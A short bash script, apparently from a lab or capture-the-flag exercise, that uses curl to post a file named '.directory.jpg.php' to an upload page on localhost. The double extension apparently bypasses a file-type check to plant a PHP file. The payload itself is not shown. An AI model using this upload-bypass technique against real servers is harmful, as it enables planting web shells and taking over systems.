#!/bin/bash
curl -X POST -H "Content-Type: multipart/form-data; boundary=---------------------------2739511481836147271226393551" --data-binary @.directory.jpg.php  "http://localhost:10080/?page=upload" -vv
